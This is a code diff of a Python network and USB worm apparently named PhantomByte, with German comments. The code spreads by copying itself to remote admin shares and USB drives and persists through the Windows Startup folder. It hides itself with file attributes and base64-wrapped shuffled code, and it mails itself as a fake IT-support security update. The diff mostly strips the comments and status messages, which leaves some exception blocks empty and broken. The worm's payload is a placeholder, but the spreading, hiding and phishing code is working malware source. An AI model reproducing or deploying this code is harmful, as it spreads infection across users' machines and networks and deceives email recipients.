@@ -14,9 +14,13 @@ import socket
 import nmap
 import subprocess
 import time
+
+
 WORM_NAME = "Urlaub2024.jpg.exe"
 HIDDEN_PATH = os.path.expanduser("~\\AppData\\Local\\Microsoft\\")
 HIDDEN_FILE = os.path.join(HIDDEN_PATH, WORM_NAME)
+
+
 
 TARGET_DIRS = [
     os.path.expanduser("~\\Desktop"),
@@ -32,6 +36,9 @@ SMTP_PORT = 25  # Port für unverschlüsseltes SMTP
 SENDER_EMAIL = "infiziert@testnetz.local"
 RECIPIENT_EMAIL = "opfer@testnetz.local"
 
+
+
+
 hidden_path = os.path.expanduser("~\\AppData\\Local\\Microsoft\\")
 startup_path = os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\")
 usb_path = "E:\\"  # Beispiel für USB-Laufwerk
@@ -46,21 +53,19 @@ def fake_function_{rnd1}():
     print("Nur ein harmloses Skript...", var_{rnd1})
 """
 
-# 🔹 Hauptfunktion des Wurms (verändert sich immer!)
+
 payload_code = f"""
 def real_payload_{rnd1}():
     print("Ich bin ein Netzwerk- & USB-Wurm! Version {rnd1}")
 """
 
-# 🔹 Code-Blöcke mischen für Tarnung
 code_blocks = [junk_code, payload_code]
 random.shuffle(code_blocks)
 final_code = "\n".join(code_blocks)
 
-# 🔹 Base64-Verschlüsselung zur Tarnung
+
 encoded_code = base64.b64encode(final_code.encode()).decode()
 
-# 🔹 Wrapper zum Entschlüsseln und Ausführen
 wrapper_code = f"""
 import base64
 exec(base64.b64decode('{encoded_code}').decode())
@@ -96,41 +101,40 @@ def infect_target(target_ip):
     remote_path = f"\\\\{target_ip}\\C$\\Users\\Public\\{worm_name}"
     try:
         shutil.copy(worm_name, remote_path)
-        print(f"✅ Wurm auf {target_ip} kopiert!")
-    except:
-        print(f"❌ Konnte {target_ip} nicht infizieren.")
+        
+    
 
-# 🔥 Netzwerkangriff starten
+
 targets = find_targets()
 for target in targets:
     infect_target(target)
 
-# 📌 USB-Infektion
+
 def infect_usb():
     """ Versucht, den Wurm auf ein USB-Laufwerk zu kopieren """
     try:
         if os.path.exists(usb_path):
             shutil.copy(worm_name, usb_path)
-            print(f"✅ Wurm auf USB-Laufwerk {usb_path} kopiert!")
+            
     except Exception as e:
-        print(f"❌ Fehler beim Kopieren auf USB: {e}")
+        
 
-# 📌 Wurm verbreiten via USB
 infect_usb()
 
-# 🔹 Wurm verstecken (unsichtbar machen)
+
+
 def hide_file():
     """ Macht die Datei unsichtbar in Windows """
     try:
         subprocess.call(["attrib", "+H", worm_name])  # Setzt das "Hidden"-Attribut
-        print(f"✅ Datei {worm_name} versteckt!")
+        
     except Exception as e:
-        print(f"❌ Fehler beim Verstecken der Datei: {e}")
+        
 
 hide_file()
 
-# 🔴 Wurm hat sich erfolgreich verbreitet und versteckt!
-print("🚀 Wurm hat sich erfolgreich verbreitet! Netzwerk & USB-Verbreitung abgeschlossen.")
+
+
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
@@ -152,7 +156,7 @@ def send_infected_email():
     body = "Hallo,\n\nBitte führen Sie das beigefügte Update aus. Es behebt kritische Sicherheitsprobleme.\n\nViele Grüße,\nIT-Support"
     msg.attach(MIMEText(body, 'plain'))
 
-    # Bösartige Datei anhängen
+  
     attachment = open(WORM_NAME, "rb")
     part = MIMEBase('application', 'octet-stream')
     part.set_payload(attachment.read())
@@ -161,7 +165,7 @@ def send_infected_email():
     msg.attach(part)
     attachment.close()
 
-    # E-Mail senden
+    
     try:
         server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
         server.sendmail(SENDER_EMAIL, RECIPIENT_EMAIL, msg.as_string())
@@ -295,7 +299,7 @@ def hide_file():
 
 
 def run_worm():
-    print("[*] PhantomByte läuft... Drücke LEERTASTE zum Stoppen.")
+    
 
     enable_autostart
     hide_file()
